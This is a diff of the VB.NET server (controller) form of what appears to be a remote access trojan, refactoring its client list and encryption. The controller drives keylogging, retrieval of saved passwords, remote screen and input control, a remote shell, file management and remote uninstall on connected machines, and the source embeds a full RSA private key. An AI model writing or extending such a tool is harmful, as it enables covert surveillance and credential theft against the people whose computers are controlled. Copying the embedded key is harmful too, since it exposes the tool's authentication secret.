@@ -14,10 +14,6 @@ Public Class Main
     ''' </summary>
     Public Shared n As New N
     ''' <summary>
-    ''' TCP Client
-    ''' </summary>
-    Dim sock As New TcpClient()
-    ''' <summary>
     ''' Data separator
     ''' </summary>
     Public Shared Sep As String = n.splitmain ''Separator
@@ -34,9 +30,9 @@ Public Class Main
     ''' </summary>
     Public WithEvents S As SocketServer
     ''' <summary>
-    ''' Client RC4 passwords in array by socket
+    ''' Clients
     ''' </summary>
-    Public Shared pw As String() ''todo: =nothing
+    Public Shared Clients As New List(Of Client) ''todo: =nothing
     ''' <summary>
     ''' Number of clients
     ''' </summary>
@@ -46,7 +42,7 @@ Public Class Main
     ''' </summary>
     Dim infotimeout As Integer
     ''' <summary>
-    ''' Folder with applicatino exe
+    ''' Folder with application exe
     ''' </summary>
     Public cfr As String = My.Application.Info.DirectoryPath
     ''' <summary>
@@ -77,6 +73,9 @@ Public Class Main
     ''' Current RSA private key
     ''' </summary>
     Public cpk As String = "<RSAKeyValue><Modulus>oQS+MurZhAp2kYh7VWeyMZrwYmmpW5GYW+WW2V74YZqobBYkD6gTnI0XfOL2NRtv46IgYPZvB7mWG7af+hAYkb+0uUu/8DGJ2VAV1AyEKAzrv0bzXk10n28npYuE5jBvACl1Im+LNG8lgcNZe8AkPa1eVN6HrziD8GDgF+Ib+XCnUcA3piFf3mleVvyK2svUO2dFb2rYJTLpnIRkHHlO9wSbHIT51hcMmy9mZIG/O2xR7smtKHwEDFDIUor6BhCiWM2BBcHPzQEcL7qBL1Tie9Kd8CAB2YMRybaEWvU1rS1WNf+CBN2eWNGd3H5GTn8enZjG5szr7C5UV8HYDRPUGrnTsfVUUVQKKnn+DR4RusegfsWLCuIhfKkrZZWDmhw/WWgZWiAvbNl51rsqD1Cr8ILcOTgaOztXSoC0NkVCzDiNIqqeSZ+LhT+ML8G3TLe0C2noYomBEcG2QogC462dgT7mTO0OYaUnhV9DTiU0pPj9bXYfotnL0sLPM/FXBTK3O41resBiEeOKi2qMHsIQCyNRY7PnuFeb/y7MMWv+QPpGlcZoiN6t8ntoIZlYSdmVaAy8qOVs0Vfh8ZICXjkvmv68JnSCCOezbjxMOCiVbTpxxcDKThom1Km6n3gBOhuZjd6QJeXZwnQBpsKRcFD0UxkzlltaMFPItu3RyhAI/90=</Modulus><Exponent>AQAB</Exponent><P>w69HSoJX4ODudjPE4Kf63tsZ1TtcnHHE2DDpf9VRxto1zN8+0h+C/G4NQdELczcUfyhInVTXTbkSQSmHT8rpl7YEWZyAcXTeNSdTFYMqpMhpDDMomF5qnQbAEqpMCX9md3OY+qCm4qVv2r0m7wgKPdY3b8igFbYxllvy+ZQkPUFUAuzqeCSHRTA4hx966MbR01tVL87q+VqwYnQy8zEU/dg3ORYjhRhItkYDJ8wVJbPYlb7eFq0Scug85PTtZA8+mTFNDL4NBCQ2jOMthOPUsg5m7jTn3xjv3wJN7t5P3rEqsaFFehh9gioucBwdKasbnJNeU7yCKpD9mhm0hhGtsw==</P><Q>0qYXoK2MQHaKDcrfBp5P2GKY7CGvik2nmPiZIaIH8Bqx3pu8FQ15kU5ftwaxlsGY2OlBlwRNadTguiuZwZ/OdxJEvW4Qtor6CukPfw4nMhnwYKxgDaYXs5UVORa3DhD1/Nj26DvuPZuZ+6eUVHD+YntsnWwf8aZl+79MtLDskO3EqOZO3owTbI84J6Apg9loEfEJhnJmKEMGX1BZqbcJuhNGik1PU+KgSQaIVOe9yahP2c/1OB2c345sb41ldeBGhC/sFpOsebBY/rDdeueFybCvbkCnsm+9ryflEV1zcnKRzvpebR5m5Yg6i8cWkUkgZR6w2z6Pmhw45CYdVxd0Lw==</Q><DP>dkj6YAigFDgDDQJIDMCdfZ6VY/ZpCcwff8s5KeOJdhkrEjcUIzGXHP1tGA7DzBZMVnzEQA4rwziO10LCHzJ5txH4WS6n2W0acKjfqQ5LdaYLEavO6yOPcHHHIsE8CzWue6Atpbn8ht4X2fIimbSTdEOL6Q8t7VHfcZMNMV4h9cEKhmYtaQgzmFgIo20c/55G8Wqw+KAsGyR9oFW7ApP1q2fKIcDHIcnHEh8KA0FyuwKWdhYU60Ic98Z4ILII2UX5weIyP/SVq540Nz+PoVeSlzrrbywdyRaq0HP1JeHOB7+yHgNtGtu46jiTL4NfAXQD0cam6xj02cQg98h3/d6rzw==</DP><DQ>J4ZkvpBx1ZKoesgLKwm/f6GYgg4cCv5hKTHUQdxOUv4fS9663tRlcB9dlFEcN2ZiEKlL1lNHV0lLVYNi2VLsAama3lRtrGLNYgizEKsOLbdyRCFz8HuuzNJ3ZfveIzSJg4UOZyr/m+27ad3a1jFRehcgnTUxlT0cu6z8bpcX/GWw1eRI/jcYWfFRnxXNVGERxvQMTn7erkVNR8si19Zxa8m8Ha096kaGvs0L/apyEQmU2hDMOVhNHCF0NUY5uHF5qcn4KZBR949gU4HKPQp+LwcJE83r6W5QEDKTJ7v6MopO06Bk4WKn+f+ixKF5mY84FeE5XBoUBd2vyxdfv/y1nw==</DQ><InverseQ>hJOgraplojNz++cqefChHWb2BxmqkeH4SlTy9mMfLbKG0v3caofKBOHzvykbeRwoqtBxojipf43XsAo1bFfp2mU0Guv8leicWlwYmP9HX3IsekJb469v2Q/EgUYw3ySCCQw4uMRz+euKKWvJGpOOzPv1yY5eqIHfbSst/6hfBP4gkx6IKaSsh5zguM7UNs7nCdBCE1qinSHsHrGOCJ8E6yJqpnsHx3kYOxQEVxBEAGX6n87lerW5zoVHtDrGlrT6zt7C9dzNFWIjAWm8RWb33PxVCqc/SfKaPTs/QSbPXGGiNrv1BvuvbBwc8kqD1OQaNl2XuN63Kc9zsPGHAYvzew==</InverseQ><D>CcMlQPMKLKSk9N5G4MuzrkKlj/uCzOfYsLs/vrGwv3VgAFJrVBbg1+oAYlr98Gq+CUzhrhJ8ctLZ4TF2WFpN39a1DB+/ZSTe8n6V6p0dQH+TP3qVJykgO/zCQgAufSiy+8CHtuz3J9h63qr+xUj5KYaJJJe4hEAZ7iLORpE35V/i7rFUiACYAZhD1v3ivhc2wkJybEN/E7cXGmoDo9JON+qSLCCuNECB5cElWEyhhBnLvrCz8rNqKQQw0QhW1k1MR02jJLuc1kh0WNRzuda2Q8MzCviPaoxoZK42YhYuorxDJAaRiUTI5Lur8k7zNkkj8wwgBKUOwx5sw94fZwbGIjjYeaWXLDCAGXGmHAJT3T+xFCUT7Z2XLKj1b4W6XgeGHVU0b00gJiABcOSnykM54ewGc9jEOStuTQPrp6s7NSW/JvqsLYMmxCtaA/uLxPHvSypIAhkPvg0ICPCeHquAsObzrglsyxvEcyyK/T7GxowXUwb6AelRdk/Vz6Zm86x9fUsa+93lNSo4rsgNQqsXzdWqLXF8SEYQXHwq+kWjIudnaUV6ZnZozD3RC/RBAgPhyq1d6dUDKXevCtpnsmJpAUQzfhXt2hkiIQ0RbY0YJOcyicqJQZZvRRG5W0ou5Hl4uspGfvP2reqMvcMXYNouhGsX0exq+L0jPrgE+Py+PYU=</D></RSAKeyValue>" ''current private key
+
+
+
 #End Region
 
     Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
@@ -120,30 +119,30 @@ Public Class Main
     ''' Disable controls on client's forms that can communicate with the client
     ''' </summary>
     ''' <param name="sock">Form socket</param>
-    Public Sub FreezeForms(ByVal sock As String)
+    Public Sub FreezeForms(ByVal cli As Client)
         Try
-            If My.Application.OpenForms(n.opentaskman & sock) IsNot Nothing Then
-                Dim f As TaskMan = My.Application.OpenForms(n.opentaskman & sock)
-                disc(f.ContextMenu)
+            If My.Application.OpenForms(n.opentaskman & cli.ID) IsNot Nothing Then
+                Dim f As TaskMan = My.Application.OpenForms(n.opentaskman & cli.ID)
+                disc(f.CMenu)
                 disc(f.KillButton)
                 disc(f.RefreshButton)
                 disc(f.NewButton)
             End If
-            If My.Application.OpenForms(n.openklog & sock) IsNot Nothing Then
-                Dim f As KeyLogger = My.Application.OpenForms(n.openklog & sock)
+            If My.Application.OpenForms(n.openklog & cli.ID) IsNot Nothing Then
+                Dim f As KeyLogger = My.Application.OpenForms(n.openklog & cli.ID)
                 disc(f.RefreshButton)
                 disc(f.ClearButton)
             End If
-            If My.Application.OpenForms(n.openutil & sock) IsNot Nothing Then
-                Dim f As Utilities = My.Application.OpenForms(n.openutil & sock)
+            If My.Application.OpenForms(n.openutil & cli.ID) IsNot Nothing Then
+                Dim f As Utilities = My.Application.OpenForms(n.openutil & cli.ID)
                 disc(f)
             End If
-            If My.Application.OpenForms(n.openpasswords & sock) IsNot Nothing Then
-                Dim f As Passwords = My.Application.OpenForms(n.openpasswords & sock)
+            If My.Application.OpenForms(n.openpasswords & cli.ID) IsNot Nothing Then
+                Dim f As Passwords = My.Application.OpenForms(n.openpasswords & cli.ID)
                 ''Nothing for now
             End If
-            If My.Application.OpenForms(n.openscreen & sock) IsNot Nothing Then
-                Dim f As Remote = My.Application.OpenForms(n.openscreen & sock)
+            If My.Application.OpenForms(n.openscreen & cli.ID) IsNot Nothing Then
+                Dim f As Remote = My.Application.OpenForms(n.openscreen & cli.ID)
                 disc(f.ToggleButton)
                 disc(f.M)
                 disc(f.C1)
@@ -153,8 +152,8 @@ Public Class Main
                 disc(f.MouseCheckBox)
                 disc(f.KeyboardCheckBox)
             End If
-            If My.Application.OpenForms(n.openfileman & sock) IsNot Nothing Then
-                Dim f As FileManager = My.Application.OpenForms(n.openfileman & sock)
+            If My.Application.OpenForms(n.openfileman & cli.ID) IsNot Nothing Then
+                Dim f As FileManager = My.Application.OpenForms(n.openfileman & cli.ID)
                 disc(f.HomeButton)
                 disc(f.RefreshButton)
                 disc(f.UpButton)
@@ -162,8 +161,8 @@ Public Class Main
                 disc(f.DirTextBox)
                 disc(f.FileContextMenuStrip)
             End If
-            If My.Application.OpenForms(n.openshell & sock) IsNot Nothing Then
-                Dim f As Shell = My.Application.OpenForms(n.openshell & sock)
+            If My.Application.OpenForms(n.openshell & cli.ID) IsNot Nothing Then
+                Dim f As Shell = My.Application.OpenForms(n.openshell & cli.ID)
                 disc(f.CommandTextBox)
             End If
         Catch ex As Exception
@@ -211,15 +210,14 @@ Public Class Main
     ''' <remarks></remarks>
     Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
         Try
+            Dim cli As Client = Clients.Find(Function(x) x.Socket = sock)
             clientcount -= 1
-            WriteToLog("Client """ & L1.Items(sock.ToString).SubItems(0).Text & """ disconnected")
+            WriteToLog("Client """ & cli.ID & """ disconnected")
             L1.Items(sock.ToString).Remove()
-            If trust.Contains(sock) Then
-                trust.Remove(sock)
-            End If
+            FreezeForms(cli)
+            Clients.Remove(cli)
         Catch ex As Exception
         End Try
-        FreezeForms(sock)
     End Sub
     ''' <summary>
     ''' Handles client connect
@@ -227,27 +225,20 @@ Public Class Main
     ''' <param name="sock">Socket</param>
     ''' <remarks></remarks>
     Sub Connected(ByVal sock As Integer) Handles S.Connected
-        clientcount += 1
-        Dim largest As Integer = clientcount ''largest socket number
-        Dim socks As Integer()
-        Dim i As Integer = 0
-        For Each x As ListViewItem In L1.SelectedItems
-            ReDim Preserve socks(i)
-            socks(i) = Integer.Parse(x.ToolTipText)
-            For Each socket As Integer In socks
-                If socket > largest Then
-                    largest = socket
-                End If
-            Next
-        Next
-        ReDim Preserve pw(largest)
+        Try
+            clientcount += 1
+            Dim cl As New Client(Nothing, sock, Nothing, False)
+            Clients.Add(cl) ''Add client to list (untrusted)
+            S.Send(cl, n.connect) ' Authentication initalization
+        Catch ex As Exception
+            MsgBox(ex.StackTrace)
+        End Try
 
-        S.Send(sock, n.connect) ' Authentication initalization
     End Sub
 
     Delegate Sub _Datad(ByVal info As Data)
     ''' <summary>
-    ''' Handles data recieved from clients
+    ''' Handles data recieved from clients?
     ''' </summary>
     ''' <param name="info">Data</param>
     ''' <remarks></remarks>
@@ -260,10 +251,7 @@ Public Class Main
         End Select
     End Sub
 
-    ''' <summary>
-    ''' List of sockets that trust the server
-    ''' </summary>
-    Public Shared trust As New List(Of Integer)
+    ''Dim clients As New 
 
     Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
     ''' <summary>
@@ -272,19 +260,19 @@ Public Class Main
     ''' <param name="sock">Socket</param>
     ''' <param name="B">Data as bytes</param>
     ''' <remarks></remarks>
-    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
-        Dim T As String
-        If trust.Contains(sock) Then
-            T = Crypt.RC4.rc4(BS(B), pw(sock)) ''decrypt data using RC4
+    Public Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
+        Dim cli As Client = Clients.Find(Function(item) item.Socket = sock) ''predicate lambda oh yeah
+        Dim T As String ''recieved data
+        If cli Is Nothing Then
+            MsgBox("Client not found!", MsgBoxStyle.Critical, "Error")
+            Exit Sub
+        End If
+        If cli.Trusted And Not BS(B).StartsWith(n.getscreen) Then
+            T = cli.Cryptor.Decrypt(BS(B), cli.Key) ''Decrypt recieved data
         Else
             T = BS(B)
         End If
-
         Dim A As String() = Split(T, Sep)
-        If Split(BS(B), Sep)(0) = n.getscreen Then ''if remote screen data
-            T = BS(B)
-            A = Split(T, Sep)
-        End If
         Try
             Select Case A(0)
                 Case n.exception
@@ -296,14 +284,14 @@ Public Class Main
                     Next
                 Case n.connect ''authentication check
                     Dim rk As Crypt.RSAResult = New Crypt.RSAResult(Convert.FromBase64String(A(1)))
-                    pw(sock) = Crypt.RSA.Decrypt(rk.AsBytes, cpk).AsString
-                    S.Send(sock, n.response & Sep & Crypt.HMACSHA512Hasher.Base64Hash(pw(sock)))
+                    Dim ts As String = Crypt.RSA.Decrypt(rk.AsBytes, cpk).AsString
+                    cli.ID = Split(ts, Sep)(0) ''Set client's name
+                    cli.Key = Split(ts, Sep)(1) ''Set client session encryption password
+                    cli.Cryptor = New Crypt.Aes256Base64Encrypter(cli.ID) ''Set up cryptor with salt as client name
+                    S.Send(cli, n.response & Sep & Crypt.HMACSHA512Hasher.Base64Hash(cli.Key))
                 Case n.response ''successfully authenticated
-                    trust.Add(sock)
-                    'For Each tt As Integer In trust
-                    '    MsgBox(tt)
-                    'Next
-                    S.Send(sock, n.getinfo) ''Get PC Name/info
+                    cli.Trusted = True
+                    S.Send(cli, n.getinfo) ''Get PC Name/info
                 Case n.getinfo ' Client Sent the PC name/info
                     If L1.Items.Item(sock.ToString) Is Nothing Then
                         Dim L = L1.Items.Add(sock.ToString, A(1), GetCountryNumber(UCase(A(3))))
@@ -320,7 +308,11 @@ Public Class Main
                             End Using
                         Catch ex As Exception
                             L.ImageKey = "zz.png" ''TODO: country to ISO
-                            L.SubItems.Add("(" & A(3) & ")")
+                            If S.IP(sock).StartsWith("192.168.") Or S.IP(sock).StartsWith("10.") Or S.IP(sock).StartsWith("172.16.") Or S.IP(sock).StartsWith("127.0.0.1") Or S.IP(sock).StartsWith("localhost") Then
+                                L.SubItems.Add("LAN")
+                            Else
+                                L.SubItems.Add("(" & A(3) & ")")
+                            End If
                         End Try
 
                         L.SubItems.Add(A(4)) ''os
@@ -344,6 +336,15 @@ Public Class Main
                             Exit For
                         End If
                     Next
+                Case n.status
+                    For i As Integer = 0 To L1.Items.Count - 1
+                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
+                            L1.Items.Item(i).SubItems(6).Text = A(1)
+                            Exit For
+                        End If
+                    Next
+                Case n.plugin ''success recieving plugin
+                    S.Send(cli, A(1)) ''todo
                 Case "F" ''file run?
                     For i As Integer = 0 To L1.Items.Count - 1
                         If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
@@ -352,44 +353,46 @@ Public Class Main
                         End If
                     Next
                 Case n.opentaskman ''open taskmanager
-                    If My.Application.OpenForms(n.opentaskman & sock) IsNot Nothing Then Exit Sub ''test if taskman for socket already open
+                    If My.Application.OpenForms(n.opentaskman & cli.ID) IsNot Nothing Then Exit Sub ''test if taskman for socket already open
                     If Me.InvokeRequired Then ''???
                         Dim j As New _Data(AddressOf Data)
                         Me.Invoke(j, New Object() {sock, B})
                         Exit Sub
                     End If
                     Dim f As New TaskMan
-                    f.sock = sock ''taskman socket
-                    f.Name = n.opentaskman & sock ''name of new taskman
-                    f.Text = f.Text & S.IP(sock) ''title += ip
+                    f.cli = cli
+                    f.Name = n.opentaskman & cli.ID ''name of new taskman
+                    f.Text = f.Text & cli.ID ''title += ip
                     f.Show() ''show taskman
                 Case n.openklog ''open keylogger window
-                    If My.Application.OpenForms(n.openklog & sock) IsNot Nothing Then Exit Sub ''test if logs for socket already open
+                    If My.Application.OpenForms(n.openklog & cli.ID) IsNot Nothing Then Exit Sub ''test if logs for socket already open
                     If Me.InvokeRequired Then
                         Dim j As New _Data(AddressOf Data)
                         Me.Invoke(j, New Object() {sock, B})
                         Exit Sub
                     End If
                     Dim f As New KeyLogger
-                    f.sock = sock ''keylogger socket
-                    f.Name = n.openklog & sock ''name of new window
-                    f.Text = f.Text & S.IP(sock) ''title += ip
+                    f.cli = cli
+                    f.Name = n.openklog & cli.ID ''name of new window
+                    f.Text = f.Text & cli.ID ''title += ip
                     f.Show() ''show
                 Case n.getklog ''set keylogger texbox to keylogs
-                    Dim F As KeyLogger = My.Application.OpenForms(n.openklog & sock) ''find window from socket
+                    Dim F As KeyLogger = My.Application.OpenForms(n.openklog & cli.ID) ''find window from socket
+                    If F Is Nothing Then Exit Sub
                     klf = cidf & Path.DirectorySeparatorChar & "keylogs.html"
                     Dim final As String = A(1)
                     final = A(1).Insert(0,
 "<!doctype html>
-<html style=""font-family:Segoe UI, Helvetica Neue, Arial, sans-serif"">
+<html style=""font-family: Segoe UI, Helvetica Neue, Arial, sans-serif;"">
 <head>
-<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8""/>
-<meta http-equiv=""X-UA-Compatible"" content=""IE=edge, chrome = 1"">
-<title>" & L1.Items(sock.ToString).SubItems(2).Text & " | " & S.IP(sock) & "</title>
+<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8""/>
+<meta http-equiv=""X-UA-Compatible"" content=""IE=edge, chrome=1"">
+<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
+<title>" & L1.Items(sock.ToString).SubItems(2).Text & " | " & cli.ID & "(" & S.IP(sock) & ")</title>
 </head>
 <body>
 <style>.k {color:#080;} .f{color:#F80;} .content{word-wrap:break-word;white-space:-moz-pre-wrap;white-space:pre-wrap}</style>
-<h1 style=""text-align:center; color: #B07;"">" & L1.Items(sock.ToString).SubItems(2).Text & " | " & S.IP(sock) & "</h1>
+<h1 style=""text-align:center; color: #B07;"">" & L1.Items(sock.ToString).SubItems(2).Text & " | " & cli.ID & "(" & S.IP(sock) & ")</h1>
 <div class=""content"">")
                     final = final.Insert(final.Length, "
 </div>
@@ -402,46 +405,46 @@ Public Class Main
                 Case n.delklog
                     MsgBox("Logs deleted from host")
                 Case n.openfileman
-                    If My.Application.OpenForms(n.openfileman & sock) IsNot Nothing Then Exit Sub
+                    If My.Application.OpenForms(n.openfileman & cli.ID) IsNot Nothing Then Exit Sub
                     If Me.InvokeRequired Then
                         Dim j As New _Data(AddressOf Data)
                         Me.Invoke(j, New Object() {sock, B})
                         Exit Sub
                     End If
                     Dim fm As New FileManager
-                    fm.sock = sock
-                    fm.Name = n.openfileman & sock
-                    fm.Text = fm.Text & S.IP(sock)
+                    fm.cli = cli
+                    fm.Name = n.openfileman & cli.ID
+                    fm.Text = fm.Text & cli.ID
                     fm.Show()
                 Case n.openutil ''utilities
-                    If My.Application.OpenForms(n.openutil & sock) IsNot Nothing Then Exit Sub
+                    If My.Application.OpenForms(n.openutil & cli.ID) IsNot Nothing Then Exit Sub
                     If Me.InvokeRequired Then
                         Dim j As New _Data(AddressOf Data)
                         Me.Invoke(j, New Object() {sock, B})
                         Exit Sub
                     End If
                     Dim fm As New Utilities
-                    fm.sock = sock
-                    fm.Name = n.openutil & sock
-                    fm.Text = fm.Text & S.IP(sock)
+                    fm.cli = cli
+                    fm.Name = n.openutil & cli.ID
+                    fm.Text = fm.Text & cli.ID
                     fm.f = Me
                     fm.Show()
                 Case n.openpasswords ''saved passwords
-                    If My.Application.OpenForms(n.openpasswords & sock) IsNot Nothing Then Exit Sub
+                    If My.Application.OpenForms(n.openpasswords & cli.ID) IsNot Nothing Then Exit Sub
                     If Me.InvokeRequired Then
                         Dim j As New _Data(AddressOf Data)
                         Me.Invoke(j, New Object() {sock, B})
                         Exit Sub
                     End If
                     Dim fm As New Passwords
-                    fm.sock = sock
-                    fm.Name = n.openpasswords & sock
-                    fm.Text = fm.Text & S.IP(sock)
+                    fm.uname = sock
+                    fm.Name = n.openpasswords & cli.ID
+                    fm.Text = fm.Text & cli.ID
                     fm.Show()
-                    S.Send(sock, n.getpasswords)
+                    S.Send(cli, n.getpasswords)
                 Case n.openscreen ' i recive size of client screen
                     ' lets start Cap form and start capture desktop
-                    If My.Application.OpenForms(n.openscreen & sock) IsNot Nothing Then Exit Sub
+                    If My.Application.OpenForms(n.openscreen & cli.ID) IsNot Nothing Then Exit Sub
                     If Me.InvokeRequired Then
                         Dim j As New _Data(AddressOf Data)
                         Me.Invoke(j, New Object() {sock, B})
@@ -449,8 +452,8 @@ Public Class Main
                     End If
                     Dim f As New Remote
                     f.F = Me
-                    f.Sock = sock
-                    f.Name = n.openscreen & sock
+                    f.cli = cli
+                    f.Name = n.openscreen & cli.ID
                     f.Sz = New Size(A(1), A(2))
                     For Each s As String In Split(A(3), n.splitalt) ''all monitors
                         If Not String.IsNullOrEmpty(s) Then
@@ -459,30 +462,27 @@ Public Class Main
                     Next
                     f.Show()
                 Case n.changescreen
-                    Dim F As Remote = My.Application.OpenForms(n.openscreen & sock)
-
-                    If F IsNot Nothing Then
-                        F.Sz = New Size(A(1), A(2))
-                        F.clear()
-                    End If
+                    Dim F As Remote = My.Application.OpenForms(n.openscreen & cli.ID)
+                    If F Is Nothing Then Exit Sub
+                    F.Sz = New Size(A(1), A(2))
+                    F.clear()
+                    S.Send(cli, Main.n.clearscreen)
                 Case n.getscreen ' recieve screen
-                    Dim F As Remote = My.Application.OpenForms(n.openscreen & sock)
-
-                    If F IsNot Nothing Then
-                        If A(1).Length = 1 Then
-                            If Not F.changes = "None" Then
-                                F.changes = "None"
-                                F.filesize = siz(B.Length)
-                                F.UpdateInfo(False)
-                            End If
-                            S.Send(sock, n.getscreen & Sep & F.C1.SelectedIndex & Sep & F.C2.Text & Sep & F.C.Value)
-                            Exit Sub
+                    Dim F As Remote = My.Application.OpenForms(n.openscreen & cli.ID)
+                    If F Is Nothing Then Exit Sub
+                    If A(1).Length = 1 Then
+                        If Not F.changes = "None" Then
+                            F.changes = "None"
+                            F.filesize = siz(B.Length)
+                            F.UpdateInfo(False)
                         End If
-                        Dim BB As Byte() = fx(B, n.getscreen & Sep)(1)
-                        F.PktToImage(BB)
+                        S.Send(cli, n.getscreen & Sep & F.C1.SelectedIndex & Sep & F.C2.Text & Sep & F.C.Value)
+                        Exit Sub
                     End If
+                    Dim BB As Byte() = fx(B, n.getscreen & Sep)(1)
+                    F.PktToImage(BB)
                 Case n.getfileman
-                    Dim fff As FileManager = My.Application.OpenForms(n.openfileman & sock)
+                    Dim fff As FileManager = My.Application.OpenForms(n.openfileman & cli.ID)
                     If A(1) = "Error" Then
                         fff.FileListView.Items.Clear()
                         fff.FileListView.Items.Add("Access Denied")
@@ -618,7 +618,8 @@ Public Class Main
                         End If
                     End If
                 Case n.gettaskman
-                    Dim f As TaskMan = My.Application.OpenForms(n.opentaskman & sock)
+                    Dim f As TaskMan = My.Application.OpenForms(n.opentaskman & cli.ID)
+                    If f Is Nothing Then Exit Sub
                     Dim r As String() = Split(A(1), n.splitspare) ''0 index is total ram
                     Dim allProcess As String() = Split(r(3), n.splitalt)
                     Dim rav As Long = Math.Round((Long.Parse(r(0)) - Long.Parse(r(1))) / Long.Parse(r(0)) * 100, 0) ''available ram
@@ -716,7 +717,8 @@ Public Class Main
 
                     f.donewait()
                 Case n.getpasswords
-                    Dim f As Passwords = My.Application.OpenForms(n.openpasswords & sock)
+                    Dim f As Passwords = My.Application.OpenForms(n.openpasswords & cli.ID)
+                    If f Is Nothing Then Exit Sub
                     f.clearwait()
                     f.ListView1.BeginUpdate()
                     f.ListView1.Items.Clear()
@@ -746,39 +748,39 @@ Public Class Main
                     ''todo: finish
                     InfoListView.Items.Add("d").SubItems.Add("s")
                 Case n.openshell ''open shell window
-                    If My.Application.OpenForms(n.openshell & sock) IsNot Nothing Then Exit Sub
+                    If My.Application.OpenForms(n.openshell & cli.ID) IsNot Nothing Then Exit Sub
                     If Me.InvokeRequired Then
                         Dim j As New _Data(AddressOf Data)
                         Me.Invoke(j, New Object() {sock, B})
                         Exit Sub
                     End If
                     Dim shp As New Shell
-                    shp.sock = sock
-                    shp.Name = n.openshell & sock
-                    shp.Text = shp.Text & S.IP(sock)
+                    shp.cli = cli
+                    shp.Name = n.openshell & cli.ID
+                    shp.Text = shp.Text & cli.ID
                     shp.Show()
                 Case n.getshell ''print to shell
-                    Dim shp As Shell = My.Application.OpenForms(n.openshell & sock)
+                    Dim shp As Shell = My.Application.OpenForms(n.openshell & cli.ID)
                     If shp IsNot Nothing Then
                         shp.OutputTextBox.AppendText(vbNewLine & A(1))
                     Else
-                        S.Send(sock, n.endshell)
+                        S.Send(cli, n.endshell)
                     End If
                 Case n.endshell ''shell killed
-                    If My.Application.OpenForms(n.openshell & sock) Is Nothing Then Exit Sub
-                    Dim shp As Shell = My.Application.OpenForms(n.openshell & sock)
+                    If My.Application.OpenForms(n.openshell & cli.ID) Is Nothing Then Exit Sub
+                    Dim shp As Shell = My.Application.OpenForms(n.openshell & cli.ID)
                     shp.OutputTextBox.AppendText(vbNewLine & "---SESSION TERMINATED---" & vbNewLine)
                 Case n.openpower ''power options
-                    If My.Application.OpenForms(n.openpower & sock) IsNot Nothing Then Exit Sub
+                    If My.Application.OpenForms(n.openpower & cli.ID) IsNot Nothing Then Exit Sub
                     If Me.InvokeRequired Then
                         Dim j As New _Data(AddressOf Data)
                         Me.Invoke(j, New Object() {sock, B})
                         Exit Sub
                     End If
                     Dim pwr As New Power
-                    pwr.sock = sock
-                    pwr.Name = n.openpower & sock
-                    pwr.Text = pwr.Text & S.IP(sock)
+                    pwr.cli = cli
+                    pwr.Name = n.openpower & cli.ID
+                    pwr.Text = pwr.Text & cli.ID
                     pwr.Show()
             End Select
         Catch ex As Exception
@@ -789,7 +791,7 @@ Public Class Main
 #End Region
 
     ''' <summary>
-    ''' Convert a percentage into a shade of yellow
+    ''' Convert a percentage into its shade of yellow
     ''' </summary>
     ''' <param name="per">Percentage</param>
     ''' <returns></returns>
@@ -827,43 +829,44 @@ Public Class Main
 
     Private Sub FileButton_Click(sender As Object, e As EventArgs) Handles FileButton.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.openfileman) ' file manager
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openfileman) ' file manager
         Next
     End Sub
 
     Private Sub RemoteButton_Click(sender As Object, e As EventArgs) Handles RemoteButton.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.openscreen)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openscreen) ''TODO
+            ''S.Send(x.ToolTipText, n.plugin & "" & Sep & n.openscreen) ''TODO
         Next
     End Sub
 
     Private Sub KeyloggerButton_Click(sender As Object, e As EventArgs) Handles KeyloggerButton.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.openklog)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openklog)
         Next
     End Sub
 
     Private Sub PasswordsButton_Click(sender As Object, e As EventArgs) Handles PasswordsButton.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.openpasswords)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openpasswords)
         Next
     End Sub
 
     Private Sub UtilitiesButton_Click(sender As Object, e As EventArgs) Handles UtilitiesButton.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.openutil)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openutil)
         Next
     End Sub
 
     Private Sub ExitButton_Click(sender As Object, e As EventArgs) Handles ExitButton.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.close)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.close)
         Next
     End Sub
 
     Private Sub UninstallButton_Click(sender As Object, e As EventArgs) Handles UninstallButton.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.uninstall)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.uninstall)
         Next
     End Sub
 
@@ -874,19 +877,19 @@ Public Class Main
         ''If InfoRadio.Checked Then mbtp = "i" Else If ExclaRadio.Checked Then mbtp = "w" Else If QuestRadio.Checked Then mbtp = "q" Else If CritRadio.Checked Then mbtp = "e"
         If InfoRadio.Checked Then mbtp = MessageBoxIcon.Information Else If ExclaRadio.Checked Then mbtp = MessageBoxIcon.Exclamation Else If QuestRadio.Checked Then mbtp = MessageBoxIcon.Question Else If CritRadio.Checked Then mbtp = MessageBoxIcon.Error
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.message & Sep & mbmsg & Sep & mbtp.ToString)
+            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.message & Sep & mbmsg & Sep & mbtp.ToString)
         Next
     End Sub
 
